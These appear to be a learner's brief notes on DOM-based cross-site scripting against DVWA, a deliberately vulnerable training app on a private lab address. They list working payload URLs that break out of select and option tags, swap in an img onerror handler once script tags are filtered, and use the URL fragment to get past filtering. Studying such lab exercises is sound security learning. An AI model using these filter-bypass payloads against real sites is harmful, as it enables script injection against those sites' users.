
In DOM base => js was catched to user inputs 

http://192.168.99.116/DVWA/vulnerabilities/xss_d/?default=English"></option></select><script>alert(1)</script>

http://192.168.99.116/DVWA/vulnerabilities/xss_d/?default=English"></script><script>alert(1)</script>

=> script tag was banned

http://192.168.99.116/DVWA/vulnerabilities/xss_d/?default=English"></option></select><img src=x onerror=alert(1)>

=> # command for url

=> that is banned if input is not normal or userinput

![[Pasted image 20230111222804.png]]


http://192.168.99.116/DVWA/vulnerabilities/xss_d/?default=English#</script><script>alert(1);</script>       => use command for #   => we have to reload 2time for DOM this one


